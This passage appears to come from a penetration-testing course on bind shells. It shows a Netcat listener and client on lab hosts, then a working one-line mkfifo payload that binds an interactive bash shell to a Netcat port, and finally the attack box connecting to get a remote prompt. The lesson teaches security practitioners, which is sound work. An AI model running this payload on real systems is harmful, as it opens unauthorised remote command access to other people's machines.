#### No. 1: Server - Target starting Netcat listener

  Bind Shells

```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```

In this instance, the target will be our server, and the attack box will be our client. Once we hit enter, the listener is started and awaiting a connection from the client.

Back on the client (attack box), we will use nc to connect to the listener we started on the server.

#### No. 2: Client - Attack box connecting to target

  Bind Shells

```shell-session
hidalg0dd@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

Notice how we are using nc on the client and the server. On the client-side, we specify the server's IP address and the port that we configured to listen on (`7777`). Once we successfully connect, we can see a `succeeded!` message on the client as shown above and a `received!` message on the server, as seen below.

#### No. 3: Server - Target receiving connection from client

  Bind Shells

```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!    
```

Know that this is not a proper shell. It is just a Netcat TCP session we have established. We can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.

#### No. 4: Client - Attack box sending message Hello Academy

  Bind Shells

```shell-session
hidalg0dd@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy  
```

Once we type the message and hit enter, we will notice the message is received on the server-side.

#### No. 5: Server - Target receiving Hello Academy message

  Bind Shells

```shell-session
Victim@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy  
```

#### No. 1: Server - Binding a Bash shell to the TCP session

  Bind Shells

```shell-session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

The commands above are considered our payload, and we delivered this payload manually. We will notice that the commands and code in our payloads will differ depending on the host operating system we are delivering it to.

Back on the client, use Netcat to connect to the server now that a shell on the server is being served.

#### No. 2: Client - Connecting to bind shell on target

  Bind Shells

```shell-session
hidalg0dd@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$  
```
